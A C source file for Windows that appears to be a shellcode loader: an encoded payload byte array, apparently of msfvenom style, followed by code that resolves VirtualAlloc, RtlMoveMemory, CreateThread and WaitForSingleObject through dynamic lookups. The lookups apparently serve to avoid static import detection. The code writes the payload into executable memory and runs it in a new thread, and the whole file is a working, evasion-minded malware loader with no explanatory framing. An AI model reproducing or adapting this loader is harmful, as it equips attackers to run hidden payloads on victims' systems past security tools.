#include <windows.h>
#include "dinvoke.h"

unsigned char buf[] =
    "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
    "\xff\xff\x48\xbb\x5a\xcb\x0e\xa1\xca\x42\xce\xbd\x48\x31\x58"
    "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xa6\x83\x8d\x45\x3a\xaa"
    "\x0e\xbd\x5a\xcb\x4f\xf0\x8b\x12\x9c\xec\x0c\x83\x3f\x73\xaf"
    "\x0a\x45\xef\x3a\x83\x85\xf3\xd2\x0a\x45\xef\x7a\x83\x85\xd3"
    "\x9a\x0a\xc1\x0a\x10\x81\x43\x90\x03\x0a\xff\x7d\xf6\xf7\x6f"
    "\xdd\xc8\x6e\xee\xfc\x9b\x02\x03\xe0\xcb\x83\x2c\x50\x08\x8a"
    "\x5f\xe9\x41\x10\xee\x36\x18\xf7\x46\xa0\x1a\xc9\x4e\x35\x5a"
    "\xcb\x0e\xe9\x4f\x82\xba\xda\x12\xca\xde\xf1\x41\x0a\xd6\xf9"
    "\xd1\x8b\x2e\xe8\xcb\x92\x2d\xeb\x12\x34\xc7\xe0\x41\x76\x46"
    "\xf5\x5b\x1d\x43\x90\x03\x0a\xff\x7d\xf6\x8a\xcf\x68\xc7\x03"
    "\xcf\x7c\x62\x2b\x7b\x50\x86\x41\x82\x99\x52\x8e\x37\x70\xbf"
    "\x9a\x96\xf9\xd1\x8b\x2a\xe8\xcb\x92\xa8\xfc\xd1\xc7\x46\xe5"
    "\x41\x02\xd2\xf4\x5b\x1b\x4f\x2a\xce\xca\x86\xbc\x8a\x8a\x56"
    "\xe0\x92\x1c\x97\xe7\x1b\x93\x4f\xf8\x8b\x18\x86\x3e\xb6\xeb"
    "\x4f\xf3\x35\xa2\x96\xfc\x03\x91\x46\x2a\xd8\xab\x99\x42\xa5"
    "\x34\x53\xe8\x74\x35\xbd\x8f\x05\xf8\x3c\xa1\xca\x03\x98\xf4"
    "\xd3\x2d\x46\x20\x26\xe2\xcf\xbd\x5a\x82\x87\x44\x83\xfe\xcc"
    "\xbd\x4b\x97\xce\x09\xf2\x43\x8f\xe9\x13\x42\xea\xed\x43\xb3"
    "\x8f\x07\x16\xbc\x28\xa6\x35\x97\x82\x34\xb0\xa3\x0f\xa0\xca"
    "\x42\x97\xfc\xe0\xe2\x8e\xca\xca\xbd\x1b\xed\x0a\x86\x3f\x68"
    "\x87\x73\x0e\xf5\xa5\x0b\x46\x28\x08\x0a\x31\x7d\x12\x42\xcf"
    "\xe0\x70\xa8\xc1\x62\xba\x34\xdb\xe9\x43\x85\xa4\xad\x1b\x93"
    "\x42\x28\x28\x0a\x47\x44\x1b\x71\x97\x04\xbe\x23\x31\x68\x12"
    "\x4a\xca\xe1\xc8\x42\xce\xf4\xe2\xa8\x63\xc5\xca\x42\xce\xbd"
    "\x5a\x8a\x5e\xe0\x9a\x0a\x47\x5f\x0d\x9c\x59\xec\xfb\x82\xa4"
    "\xb0\x03\x8a\x5e\x43\x36\x24\x09\xf9\x7e\x9f\x0f\xa0\x82\xcf"
    "\x8a\x99\x42\x0d\x0e\xc9\x82\xcb\x28\xeb\x0a\x8a\x5e\xe0\x9a"
    "\x03\x9e\xf4\xa5\x0b\x4f\xf1\x83\xbd\x06\xf0\xd3\x0a\x42\x28"
    "\x0b\x03\x74\xc4\x96\xf4\x88\x5e\x1f\x0a\xff\x6f\x12\x34\xc4"
    "\x2a\xc4\x03\x74\xb5\xdd\xd6\x6e\x5e\x1f\xf9\x3e\x08\xf8\x9d"
    "\x4f\x1b\x6c\xd7\x73\x20\xa5\x1e\x46\x22\x0e\x6a\xf2\xbb\x26"
    "\xc1\x8e\x5a\x2a\x37\xcb\x06\x1d\xd8\x7c\xce\xa0\x42\x97\xfc"
    "\xd3\x11\xf1\x74\xca\x42\xce\xbd";

typedef LPVOID(WINAPI *VirtualAlloc_t)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect);

typedef VOID(WINAPI *RtlMoveMemory_t)(
    VOID UNALIGNED *Destination,
    const VOID UNALIGNED *Source,
    SIZE_T Length);

typedef HANDLE(WINAPI *CreateThread_t)(
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    __drv_aliasesMem LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId);

typedef DWORD(WINAPI *WaitForSingleObject_t)(
    HANDLE hHandle,
    DWORD dwMilliseconds);

typedef enum AppPolicyWindowingModel {
  AppPolicyWindowingModel_None,
  AppPolicyWindowingModel_Universal,
  AppPolicyWindowingModel_ClassicDesktop,
  AppPolicyWindowingModel_ClassicPhone
} AppPolicyWindowingModel ;

typedef LONG(WINAPI *AppPolicyGetWindowingModel_t)(
    HANDLE processToken,
    AppPolicyWindowingModel *policy);

int main(void)
{
    RtlMoveMemory_t MyRtlMoveMemory = (RtlMoveMemory_t)(ULONG_PTR)RfGetProcAddressA(
        RfGetModuleHandleW(L"ntdll.dll"),
        "RtlMoveMemory");
    VirtualAlloc_t VirtualAlloc = (VirtualAlloc_t)(ULONG_PTR)RfGetProcAddressA(
        RfGetModuleHandleW(L"kernEl32.DLL"),
        "VirtualAlloc");
    CreateThread_t CreateThread = (CreateThread_t)(ULONG_PTR)RfGetProcAddressA(
        RfGetModuleHandleW(L"KERNEL32.DLL"),
        "CreateThread");
    WaitForSingleObject_t WaitForSingleObject = (WaitForSingleObject_t)(ULONG_PTR)RfGetProcAddressA(
        RfGetModuleHandleW(L"KERNEL32.DLL"),
        "WaitForSingleObject");

    void *buf_routine = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    MyRtlMoveMemory(buf_routine, buf, sizeof(buf));

    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)buf_routine, 0, 0, 0);
    WaitForSingleObject(th, INFINITE);

    return 0;
}